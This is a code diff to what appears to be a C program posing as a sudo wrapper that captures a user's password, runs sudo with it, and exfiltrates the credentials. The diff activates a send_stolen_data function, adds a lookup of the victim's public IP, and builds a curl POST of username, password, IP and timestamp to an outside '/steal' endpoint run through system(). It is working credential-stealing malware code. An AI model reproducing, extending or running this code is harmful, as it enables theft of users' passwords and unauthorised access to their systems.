@@ -47,10 +47,7 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
 
-    // NEED IP IDK HOW TO GET
-    // 
-    // 
-    // send_stolen_data(username, passwd, ip);
+    send_stolen_data(username, passwd);
     
     char ** cmd_ray = make_execvp_args(argc, argv);
     runSudo(passwd, cmd_ray, 0);
@@ -133,13 +130,29 @@ int get_virus_name(char * escaped_path){
 
 }
 
-void send_stolen_data(char *username, char *password, char *ip) {
+void send_stolen_data(char *username, char *password) {
   char command[1024];
 
-  snprintf(command, sizeof(command),
-           "bash -c 'curl -X POST -d \"username=%s&password=%s&ip=%s&timestamp=$(date)\" https://cyber.stanleyhoo1.tech/steal > /dev/null 2>&1'",
-           username, password, ip);
+  // Copied from here: https://stackoverflow.com/a/65382305
+  FILE* file = popen("curl -s https://api.ipify.org", "r");
+  char *out = NULL;
+  size_t outlen = 0;
 
+  char ip[256] = "";
+
+  while (getline(&out, &outlen, file) >= 0) {
+      strcat(ip, out);
+  }
+
+  pclose(file);
+  free(out);
+
+  // Create the full curl POST request
+  snprintf(command, sizeof(command),
+           "bash -c 'curl -X POST -d \"username=%s&password=%s&ip=%s&timestamp=$(date)\" https://cyber.stanleyhoo1.tech/steal'",
+           "test", "supersecure", ip);
+
+  // Run the command
   system(command);
 }
 
